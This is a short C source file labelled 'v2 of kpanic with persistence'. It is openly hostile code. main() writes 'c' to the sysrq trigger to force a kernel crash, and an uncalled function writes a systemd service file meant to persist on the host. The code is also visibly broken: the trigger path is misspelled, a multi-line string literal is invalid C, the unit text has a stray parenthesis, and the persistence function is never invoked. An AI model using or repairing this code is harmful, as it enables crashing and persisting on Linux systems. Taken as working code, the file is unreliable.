/* v2 of kpanic with persistence */ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100

int fileio () {

    char cd[MAX_CMN_LEN] = "cd /usr/lib/systemd/system/";
    char touch[MAX_CMN_LEN] = "touch kpanic.service";
    system(cd);
    system(touch);
    
    char ch;
    FILE *fpr;
    fpr = fopen("/usr/lib/systemd/system/kpanic.service", "w+");
    fputs("[Unit]
    Description=test

    [Service]
    ExecStart=/bin/bash 

    [Install]
    WantedBy=multi-user.target)
    
    ", fpr);

    return 0;
}

int main () {
    char kpanic[MAX_CMN_LEN] = "echo c > /proc/sysrq-triggers", **p;
    system(kpanic);
    return 0;
}